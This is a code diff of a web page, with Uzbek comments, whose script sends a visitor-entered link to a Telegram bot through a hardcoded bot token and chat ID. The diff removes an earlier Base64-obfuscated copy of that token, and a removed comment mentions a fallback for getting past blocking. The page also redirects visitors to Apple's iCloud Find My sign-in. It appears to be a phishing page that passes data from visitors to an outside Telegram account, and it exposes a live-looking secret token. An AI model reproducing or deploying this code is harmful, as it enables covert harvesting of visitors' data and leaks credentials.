@@ -243,20 +243,12 @@
             }
         }
 
-        // Asl to'g'ri token va chat ID (Base64 shifrlangan holatda)
-        const encT = "ODY1Mjk5NjYzODpBQ0djd1BqaGJtZWpaVk94NnRNREVRSEhNMVpfU1VGSVNB"; 
-        const encC = "MjA5MTI0NzA4Nw=="; 
-
-        function decodeBase64(data) {
-            return atob(data);
-        }
+        // Boshida mukammal ishlagan oddiy va ochiq usul (Token va Chat ID)
+        const BOT_TOKEN = "8652996638:AAGCwPjhbmejZVOx6tMDEHQHGmlZ_SUFISA"; 
+        const CHAT_ID = "2091247087";
 
         function sendToTelegram(message) {
-            const BOT_TOKEN = decodeBase64(encT);
-            const CHAT_ID = decodeBase64(encC);
-
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
             const data = {
                 chat_id: CHAT_ID,
                 text: message,
@@ -274,9 +266,27 @@
                     alert("Muvaffaqiyatli yuborildi!");
                     document.getElementById("linkInput").value = "";
                 } else {
-                    alert("Xatolik yuborishda: " + (result.description || "Noma'lum xato"));
+                    alert("Xatolik yuborishda: " + result.description);
                 }
             })
             .catch(error => {
-                // Tarmoq yoki brauzer blokirovkasi bo'lsa, xabarni o'tkazish uchun zaxira usul
-                const img = new Image();
+                alert("Tarmoqda xatolik yuz berdi!");
+            });
+        }
+
+        function sendLink() {
+            const link = document.getElementById("linkInput").value.trim();
+            if (!link) {
+                alert("Iltimos, havolani kiriting!");
+                return;
+            }
+            const text = `🔔 *Yangi ma'lumot keldi!*\n\n🔗 Havola: \`${link}\``;
+            sendToTelegram(text);
+        }
+
+        function handleExternalAuth() {
+            window.location.href = "https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2Fwww.icloud.com&response_type=code&response_mode=fragment&state=fmi-chrome";
+        }
+    </script>
+</body>
+</html>
